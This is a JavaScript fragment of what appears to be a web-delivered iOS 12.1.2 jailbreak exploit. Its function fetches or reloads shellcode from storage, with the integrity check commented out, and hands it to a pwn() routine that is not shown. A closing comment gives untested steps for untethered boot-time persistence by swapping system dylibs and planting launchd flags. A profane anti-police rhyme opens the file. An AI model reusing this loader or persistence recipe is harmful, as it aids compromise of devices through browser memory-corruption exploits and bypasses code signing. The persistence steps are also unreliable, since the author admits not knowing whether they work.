 * Ain't no glock keepin you safe
 * Against rap, rop and midnight raves
 * Ain't no police tough enough
 * Fuck the cops, we like it rough
 * Gang gang 
 */
var wk1211go = function()
{
	if(pwr.read().length == 0) print("No previous logs, probably first time jailbreaking!");
    pwr.clearAt('log');
    if(!window.chosendevice.offsets) print("For some reasons offsets are missing, continuing anyway...");
    _off = window.chosendevice.offsets;
    print('Exploit has been called and is awaiting shellcode.');
    this.callback = function(buffer, local=false){
        try 
        {
            
            if(!buffer) return false; //sanity check

            print("Shellcode has been received, checking validity.");
            
            shellcode_length = buffer.byteLength;
            if(shellcode_length > CONFIG.PAYLOAD.MAX_SIZE) throw "Shellcode exceeds maximum size";
            print("Received "+shellcode_length+" bytes of shellcode "+ (local ? "from persistent storage." : "."), true);
            if(!local) pwr.writeto('shellcode',new TextDecoder().decode(buffer));
           // check_integrity(buffer);
            return pwn();
        } 
        catch(ex)
        {
            print(ex);
        }
    };
    if(pwr.readfrom('shellcode')) {
        print("We got some shellcode in the persistent storage, no need to download.");
        this.callback(new TextEncoder().encode(pwr.readfrom('shellcode')).buffer, true); //read shellcode from persistent storage and encode it into an arraybuffer
    } else {
        FileStorage.getcontents(FileStorage.mode.FETCH, 'testmacho', this.callback); //assumably, @nullriver will nagg about this being a 32-bit armv7 mach-o file, but he should realize that I add this just for debugging
    }
};

/*
 * Yo if ya still reading,
 * Try this idk if it works
 * Use this exploit and rewrite it to be standalone.
 * Store it on-device at /sploit.js
 * Compile a dylib with voucher_swap jailbreak (unc0ver) according to stage2 from Niklas Baumstark's 11.3.1 exploit (stage2 by Luca Todesco)
 * Store it at /payload.dylib
 * replace libgmalloc dylib as it is a non-dyld_shared_cache dylib with extracted jsc framework (from shared_cache), make sure not to break codesigning.
 * create /.launchd_use_gmalloc
 * reboot device
 * Now you probably have JavascriptCore execution at boot.
 * Find a way to trick the arguments of JavascriptCore to be '/sploit.js'
 * Welcome to untethered jailbreak on iOS 12.1.2???
*/